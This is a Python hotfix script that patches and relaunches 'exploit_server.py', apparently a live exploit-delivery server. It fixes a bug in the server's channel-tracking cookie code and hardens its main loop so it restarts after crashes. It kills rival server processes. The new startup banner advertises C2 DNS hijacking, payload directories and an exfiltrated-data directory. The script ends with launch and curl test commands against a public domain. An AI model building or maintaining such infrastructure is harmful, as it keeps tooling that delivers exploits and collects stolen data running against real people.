# -*- coding: utf-8 -*-
"""
_v204_hotfix15v2.py  Ultimate triple-fix

 PATCH0 [SELF-AST-OK] self-check ast.parse() before apply
 PATCH1-R1: Replace main() tail - banner, log, serve_forever block
            to [DS-READY-HF15v2] + self-connect + while True (exit SystemExit(88) after 5 crashes)
 PATCH2-R2: Insert [PREFLIGHT-PURGE] above banner=f block (kill orphan workers)
 PATCH3-R3 (Fix UnboundLocalError expires): in do_GET if tpl_slug branch only assigns expires,
            later log_cid/log_tid branches unconditionally use expires -> UnboundLocalError Empty reply.
            Fix: initialize expires = '' first + wrap cookie block in try/except Exception.
"""
import os, sys, time, shutil, ast, re

SELF_FILE = os.path.abspath(__file__)
# ═══════════════════════════════════════════════════════════════
# PATCH0: 先检查自己脚本的 AST! (不能有 unmatched 括号)
# ═══════════════════════════════════════════════════════════════
try:
    with open(SELF_FILE, 'r', encoding='utf-8') as _me:
        ast.parse(_me.read())
    print('[SELF-AST-OK] ✅ hotfix15v2 脚本自身 ast.parse PASS (无 unmatched 括号)')
except SyntaxError as _e:
    print(f'[SELF-AST-FAIL] ❌ hotfix15v2 脚本自身语法错误 L{_e.lineno} off={_e.offset}: {_e.msg}')
    sys.exit(2)

PROJ   = '/www/wwwroot/coruna/server'
ESFILE = os.path.join(PROJ, 'exploit_server.py')
BAKDIR = os.path.join(PROJ, 'bak_v204_hotfix15v2')
os.makedirs(BAKDIR, exist_ok=True)

ts = time.strftime('%Y%m%d%H%M%S')
bak = os.path.join(BAKDIR, f'exploit_server.py.bak-{ts}')
shutil.copy2(ESFILE, bak)
ORIG_SIZE = os.path.getsize(ESFILE)
print(f'[BAK] {bak} (size={ORIG_SIZE})')

with open(ESFILE, 'rb') as f:
    src_bytes = f.read()
ORIG_NL = b'\r\n' if src_bytes.count(b'\r\n') > src_bytes.count(b'\n') * 0.5 else b'\n'
src = src_bytes.decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n')
print(f'[INFO] ORIG_NL={ORIG_NL!r} src_len={len(src)} lines={src.count(chr(10))}')

def _find_last(pattern, text):
    positions = [m.start() for m in re.finditer(pattern, text, flags=re.MULTILINE)]
    return positions[-1] if positions else -1

# ═══════════════════════════════════════════════════════════════
# PATCH3-R3 (先做! do_GET L2424-2431: 修 UnboundLocalError 'expires')
#   锚点 (唯一长字符串!):
#     "if tpl_slug:\n            expires = ...\n" +
#     "            self.send_header('Set-Cookie', f\"tpl={urllib.parse.quote(tpl_slug)}; ...\")\n" +
#     "            if log_cid:\n                self.send_header('Set-Cookie', f\"ds_chid={log_cid}; ... expires ...\")\n"
# ═══════════════════════════════════════════════════════════════
OLD_P3 = (
    "            if tpl_slug:\n"
    "                expires = \"Expires=\" + __import__(\"datetime\").datetime.utcfromtimestamp(__import__(\"time\").time() + 86400).strftime(\"%a, %d-%b-%Y %H:%M:%S GMT\")\n"
    "                self.send_header(\"Set-Cookie\", f\"tpl={urllib.parse.quote(tpl_slug)}; Path=/; {expires}; SameSite=Lax\")\n"
    "            # Preserve channel info for legacy Coruna\n"
    "            if log_cid:\n"
    "                self.send_header(\"Set-Cookie\", f\"ds_chid={log_cid}; Path=/; {expires}; SameSite=Lax\")\n"
    "            if log_tid:\n"
    "                self.send_header(\"Set-Cookie\", f\"ds_tpid={log_tid}; Path=/; {expires}; SameSite=Lax\")"
)
if OLD_P3 in src:
    P3_START = src.index(OLD_P3)
    NEW_P3 = '''            # PATCH v20.4-HOTFIX15v2-R3: expires 变量必须在 tpl_slug/log_cid/log_tid 任何分支前初始化, 否则 UnboundLocalError → Empty reply (curl 52)
            expires = ''
            try:
                if tpl_slug:
                    expires = "Expires=" + __import__("datetime").datetime.utcfromtimestamp(__import__("time").time() + 86400).strftime("%a, %d-%b-%Y %H:%M:%S GMT")
                    self.send_header("Set-Cookie", f"tpl={urllib.parse.quote(tpl_slug)}; Path=/; {expires}; SameSite=Lax")
                # Preserve channel info for legacy Coruna
                if log_cid:
                    self.send_header("Set-Cookie", f"ds_chid={log_cid}; Path=/; {expires}; SameSite=Lax")
                if log_tid:
                    self.send_header("Set-Cookie", f"ds_tpid={log_tid}; Path=/; {expires}; SameSite=Lax")
            except Exception as _hf15_p3_e:
                try:
                    import admin.common as _ac
                    if _ac and hasattr(_ac, 'log_to_file'):
                        _ac.log_to_file(f"[EXPIRES-FALLBACK] do_GET cookie err: {_hf15_p3_e}")
                    else:
                        print(f"[EXPIRES-FALLBACK] do_GET cookie err: {_hf15_p3_e}", flush=True)
                except Exception:
                    pass'''
    src = src[:P3_START] + NEW_P3 + src[P3_START + len(OLD_P3):]
    print(f'[PATCH3-R3] ✅ 修 UnboundLocalError expires: offset {P3_START} old={len(OLD_P3)} new={len(NEW_P3)}')
    try:
        ast.parse(src)
        print('[PATCH3-R3 AST] ✅ ast.parse PASS')
    except SyntaxError as _e:
        print(f'[PATCH3-R3 AST] ❌ SYNTAX ERR L{_e.lineno} off={_e.offset}: {_e.msg}')
        shutil.copy2(bak, ESFILE)
        sys.exit(3)
else:
    print('[PATCH3-R3] ⚠ 老 P3 块 (OLD_P3 精确串) 没找到, 可能已修过, 跳过. (如果已经有 EXPIRES-FALLBACK 字样=正常)')

# ═══════════════════════════════════════════════════════════════
# PATCH1-R1: main() 尾部 banner + log + 老 serve_forever → 永不返回模式
# ═══════════════════════════════════════════════════════════════
# R1_START = 最后 1 个 banner = f""" 位置
R1_START = _find_last(r'banner\s*=\s*f"""', src)
if R1_START < 0:
    print('[FATAL] R1_START: 找不到 banner=f"""... 锚点'); sys.exit(4)
# R1_END = R1_START 向后找最后 1 个 server.shutdown() 然后其行尾 (该行 \n 之后)
tail_for_end = src[R1_START:]
_sd_positions = [m.start() for m in re.finditer(r'server\.shutdown\(\)', tail_for_end)]
if not _sd_positions:
    print('[FATAL] R1_END: 在 banner...段内找不到 server.shutdown()'); sys.exit(5)
last_sd_off = _sd_positions[-1]
# 取 last_sd_off 所在行 末 \n
_nl = tail_for_end.find('\n', last_sd_off)
if _nl < 0:
    _nl = len(tail_for_end)
R1_END_rel = _nl
R1_END = R1_START + R1_END_rel
OLD_P1 = src[R1_START:R1_END]
banner_line_1 = OLD_P1.split('\n', 1)[0]
R1_INDENT_STR = banner_line_1[: len(banner_line_1) - len(banner_line_1.lstrip(' '))]
R1_INDENT_N   = len(R1_INDENT_STR)
if R1_INDENT_N < 4:
    print(f'[FATAL] R1_INDENT_N={R1_INDENT_N} <4, 锚点不对 (banner 不在 main() 内)')
    sys.exit(6)
print(f'[PATCH1-R1] OFFSET {R1_START}:{R1_END}  bytes={len(OLD_P1)} indent_N={R1_INDENT_N}')
print(f'[PATCH1-R1] FIRST 180 chars:')
print('\n'.join(['  │ ' + ln for ln in OLD_P1[:180].splitlines()]))
print(f'[PATCH1-R1] LAST  180 chars:')
print('\n'.join(['  │ ' + ln for ln in OLD_P1[-180:].splitlines()]))

TI = R1_INDENT_STR
SI = TI + '    '
DI = TI + '        '
SDI= TI + '            '
NEW_P1 = f'''{TI}banner = f"""
{TI}╔══════════════════════════════════════════════════════════════╗
{TI}║              EXPLOIT SERVER - READY                          ║
{TI}╠══════════════════════════════════════════════════════════════╣
{TI}║  Access URL:     http://{{args.host}}:{{args.port}}/
{TI}║                  http://localhost:{{args.port}}/
{TI}║  C2 DNS hijack:  Internal DNS -> {{args.host}}:80 (if bound)
{TI}║  Payloads dir:   {{PAYLOADS_DIR}}
{TI}║  Templates dir:  {{TEMPLATES_DIR}}
{TI}║  Exfil data dir: {{EXFIL_DIR}}
{TI}║  Log file:       {{LOG_FILE}}
{TI}║  DB available:   {{DB_AVAILABLE}}
{TI}╚══════════════════════════════════════════════════════════════╝
{TI}"""
{TI}if C2_HOST:
{TI}    banner += f"║  C2 Host:        {{C2_HOST}}\\n"
{TI}if REDIRECT_URL:
{TI}    banner += f"║  Redirect URL:   {{REDIRECT_URL}}\\n"
{TI}banner += "╚══════════════════════════════════════════════════════════════╝\\n"
{TI}banner += "\\n[!] Press Ctrl+C to stop\\n"
{TI}
{TI}print(banner)
{TI}startup_log = f"Exploit server started on http://{{args.host}}:{{args.port}} | DB={{DB_AVAILABLE}}"
{TI}log_to_file(startup_log)
{TI}log_to_file(f"Payloads: {{PAYLOADS_DIR}}")
{TI}log_to_file(f"Exfil dir: {{EXFIL_DIR}}")
{TI}log_to_file(f"Log file: {{LOG_FILE}}")
{TI}
{TI}# PATCH v20.4-HOTFIX15v2-R1: [DS-READY-HF15v2] 永不返回模式. self-connect probe + while True.
{TI}import socket as _diag_sk, os as _diag_os, sys as _diag_sys, time as _diag_tm
{TI}try:
{TI}    _ds_pid  = _diag_os.getpid()
{TI}    _ds_ppid = _diag_os.getppid()
{TI}    _ds_pgid = _diag_os.getpgrp() if hasattr(_diag_os, "getpgrp") else -1
{TI}    print(f"[DS-READY-HF15v2] pid={{_ds_pid}} ppid={{_ds_ppid}} pgid={{_ds_pgid}} port={{args.port}} → ENTER INFINITE serve_forever LOOP", flush=True)
{TI}    _diag_sys.stdout.flush(); _diag_sys.stderr.flush()
{TI}    _s1 = _diag_sk.socket(_diag_sk.AF_INET, _diag_sk.SOCK_STREAM)
{TI}    _rr = _s1.connect_ex(("127.0.0.1", int(args.port)))
{TI}    print(f"[DS-READY-HF15v2] 127.0.0.1:{{args.port}} self-connect_ex={{_rr}} (0=LISTEN OK)", flush=True)
{TI}    _s1.close()
{TI}except Exception as _diag_e:
{TI}    print(f"[DS-READY-HF15v2] probe err {{type(_diag_e).__name__}}: {{_diag_e}}", flush=True)
{TI}
{TI}_ds_attempt = 0
{TI}while True:
{TI}    _ds_attempt += 1
{TI}    print(f"[DS-SF-LOOP] attempt={{_ds_attempt}} → server.serve_forever(poll=0.3)", flush=True)
{TI}    try:
{SI}server.serve_forever(poll_interval=0.3)
{DI}except KeyboardInterrupt:
{SI}stop_msg = "Server stopped by user."
{SI}print(f"\\n[*] {{stop_msg}}")
{SI}try: log_to_file(stop_msg)
{SI}except Exception: pass
{SI}try: server.shutdown()
{SI}except Exception: pass
{SI}break
{DI}except SystemExit as _ds_se:
{SI}print(f"[DS-SF-EXIT] SystemExit(code={{_ds_se.code}}) → propagate.", flush=True)
{SI}try: log_to_file(f"[DS-SF-EXIT] SystemExit {{_ds_se.code}}")
{SI}except Exception: pass
{SI}raise
{DI}except BaseException as _ds_sf_e:
{SI}import traceback as _ds_tb
{SI}_ts = _diag_tm.strftime("%Y-%m-%d %H:%M:%S")
{SI}_msg = f"[DS-CRASH-SF-{{_ds_attempt}}] [{{_ts}}] pid={{_ds_pid}} {{type(_ds_sf_e).__name__}}: {{_ds_sf_e}}"
{SI}print(_msg, flush=True)
{SI}try: log_to_file(_msg)
{SI}except Exception: pass
{SI}_ds_tb.print_exc()
{SI}if _ds_attempt >= 5:
{SDI}    print(f"[DS-CRASH-SF] serve_forever 连续崩溃 {{_ds_attempt}} 次 → SystemExit(88).", flush=True)
{SDI}    raise SystemExit(88)
{SI}print(f"[DS-CRASH-SF] 3s 后第 {{_ds_attempt+1}} 次重入 serve_forever loop...", flush=True)
{SI}try: _diag_tm.sleep(3)
{SDI}except (KeyboardInterrupt, SystemExit): pass
{SI}try: server.shutdown()
{SI}except Exception: pass
{SI}try: server.server_close()
{SI}except Exception: pass
{SI}_diag_tm.sleep(2)
{SI}try:
{SDI}    print(f"[DS-SF-REBIND] attempt {{_ds_attempt+1}} Rebind ReusableThreadingHTTPServer...", flush=True)
{SDI}    server = ReusableThreadingHTTPServer((args.host, args.port), DarkSwordHandler)
{SI}except Exception as _rebind_e:
{SDI}    print(f"[DS-SF-REBIND] 失败 {{type(_rebind_e).__name__}}: {{_rebind_e}}. 2s 后 loop 再试", flush=True)
{SDI}    _diag_tm.sleep(2)
{TI}print(f"[DS-SF-LOOP-END] KeyboardInterrupt/SystemExit → main return.", flush=True)
'''
src = src[:R1_START] + NEW_P1 + src[R1_END:]
print(f'[PATCH1-R1] ✅ 替换 {len(OLD_P1)} chars → {len(NEW_P1)} chars')

# ═══════════════════════════════════════════════════════════════
# PATCH2-R2: banner=f""" 正上方插入 PURGE 残留
# ═══════════════════════════════════════════════════════════════
R2_INSERT_AT = src.find('\n' + TI + 'banner = f"""')
if R2_INSERT_AT < 0:
    R2_INSERT_AT = src.find(TI + 'banner = f"""')
if R2_INSERT_AT < 0:
    print('[FATAL] R2 找不到 banner 锚点'); shutil.copy2(bak, ESFILE); sys.exit(7)
print(f'[PATCH2-R2] INSERT AT off={R2_INSERT_AT} (banner 正上方)')
PURGE = f'''
{TI}# PATCH v20.4-HOTFIX15v2-R2: 100% 清理除 self 外所有 exploit_server.py 残留进程, 防止 PREFLIGHT 漏杀残留 worker 持 LISTEN 抢端口
{TI}try:
{TI}    import subprocess as _ds_sp, signal as _ds_sg, os as _ds_os, time as _ds_tm
{TI}    _my_pid = _ds_os.getpid()
{TI}    try:
{TI}        _ps_out = _ds_sp.run(["pgrep", "-af", "exploit_server.py"],
{TI}                              stdout=_ds_sp.PIPE, stderr=_ds_sp.DEVNULL, timeout=4, check=False).stdout.decode("utf-8","ignore")
{TI}    except Exception:
{TI}        _ps_out = ""
{TI}    _kp = []
{TI}    for _pln in _ps_out.splitlines():
{TI}        try:
{TI}            _parts = _pln.split(None, 1)
{TI}            if not _parts: continue
{TI}            _p = int(_parts[0])
{TI}            if _p != _my_pid and _p > 1 and _p != _ds_os.getppid():
{TI}                _cmd = (_parts[1] if len(_parts) > 1 else '').lower()
{TI}                if ('exploit_server' in _cmd) and ('nginx' not in _cmd) and ('mysqld' not in _cmd):
{TI}                    _kp.append(_p)
{TI}        except Exception:
{TI}            continue
{TI}    if _kp:
{TI}        print(f"[PREFLIGHT-PURGE] 🔴 清理残留 exploit_server.py PIDs={{sorted(_kp)}} (self={{_my_pid}})", flush=True)
{TI}        for _p in _kp:
{TI}            try: _ds_os.kill(_p, _ds_sg.SIGKILL)
{TI}            except Exception: pass
{TI}        _ds_tm.sleep(1.5)
{TI}except Exception:
{TI}    pass
'''
src = src[:R2_INSERT_AT] + PURGE + src[R2_INSERT_AT:]
print(f'[PATCH2-R2] ✅ PURGE 插入 {len(PURGE)} chars 于 off={R2_INSERT_AT}')

# ═══════════════════════════════════════════════════════════════
# FINAL SYNTAX
# ═══════════════════════════════════════════════════════════════
try:
    ast.parse(src)
    print('[FINAL AST] ✅ ast.parse PASS (3 PATCH 全部语法正确)')
except SyntaxError as e:
    print(f'[FINAL AST] ❌ SYNTAX ERR L{e.lineno} off={e.offset}: {e.msg}')
    fl = src.split('\n')
    for ek in range(max(1, e.lineno-4), min(len(fl), e.lineno+4)):
        print(f'  L{ek:4d}|{fl[ek-1][:180]}')
    shutil.copy2(bak, ESFILE)
    sys.exit(8)

# ═══════════════════════════════════════════════════════════════
# WRITE BACK
# ═══════════════════════════════════════════════════════════════
if ORIG_NL == b'\r\n':
    fb = src.replace('\n', '\r\n').encode('utf-8')
else:
    fb = src.encode('utf-8')
with open(ESFILE, 'wb') as f:
    f.write(fb)
NEW_SIZE = os.path.getsize(ESFILE)
print(f'[WRITE] before={ORIG_SIZE} after={NEW_SIZE} delta={NEW_SIZE-ORIG_SIZE:+d}')

# VERIFY
def gm(p):
    return sorted(set(1 + src[:m.start()].count('\n') for m in re.finditer(p, src, flags=re.MULTILINE)))
print(f'[VERIFY] DS-READY-HF15v2        L={gm(r"DS-READY-HF15v2")}')
print(f'[VERIFY] DS-SF-LOOP              L={gm(r"DS-SF-LOOP")}')
print(f'[VERIFY] PREFLIGHT-PURGE        L={gm(r"PREFLIGHT-PURGE")}')
print(f'[VERIFY] EXPIRES-FALLBACK       L={gm(r"EXPIRES-FALLBACK")}')
print(f'[VERIFY] SystemExit(88)         L={gm(r"SystemExit\(88\)")}')
print(f'[VERIFY] CH-SAFE-302 (hf12v3)   L={gm(r"CH-SAFE-302-(OK|SKIP)")}')
# 检测旧 DS-READY 无后缀 残留:
if 'DS-READY-HF15v2' in src:
    lines = src.split('\n')
    bad_old = []
    for i, ln in enumerate(lines, 1):
        s = ln.lstrip()
        if ('DS-READY' in s) and ('DS-READY-HF15v2' not in s) and s.startswith('print('):
            bad_old.append(i)
    if bad_old:
        print(f'[VERIFY-WARN] 旧 DS-READY (无 HF15v2 后缀) print 语句仍存在 L={bad_old} (可能没命中, 通常非致命)')
    else:
        print('[VERIFY] ✅ 旧 DS-READY print 已全部替换成 DS-READY-HF15v2')
print('✅ HOTFIX15v2 应用完成!')
print()
print('👉 启动命令:')
print('   pkill -9 -f exploit_server.py ; sleep 2')
print('   pgrep -af exploit_server.py ; ss -lntp | grep :7070')
print('   (以上 2 条必须空! 否则再 pkill)')
print('   export DS_SKIP_PREFLIGHT_SETSID=1')
print('   cd /www/wwwroot/coruna/server')
print('   nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 -u exploit_server.py -H 0.0.0.0 -p 7070 --no-port-80 > /tmp/exploit_server.log 2>&1 &')
print('   echo NEW_PID=$! ; sleep 8')
print('   grep -nE "PREFLIGHT-PURGE|DS-READY-HF15v2|DS-SF-LOOP|DS-CRASH-SF|self-connect_ex=|EXPIRES-FALLBACK|UnboundLocalError" /tmp/exploit_server.log')
print('   curl -sS -o /dev/null -w "C1 test001 code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 8 http://127.0.0.1:7070/ch/test001')
print('   curl -sS -o /dev/null -w "C2 nonexist code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 8 http://127.0.0.1:7070/ch/notexist_xyz')
print('   curl -sk -o /dev/null -w "C3 HTTPS test001 code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 15 https://aa1234.dpdns.org/ch/test001')
print('   curl -sk -o /dev/null -w "C4 HTTPS nonexist code=%{http_code} loc=%{redirect_url} size=%{size_download}\\n" --max-time 15 https://aa1234.dpdns.org/ch/notexist_xyz')
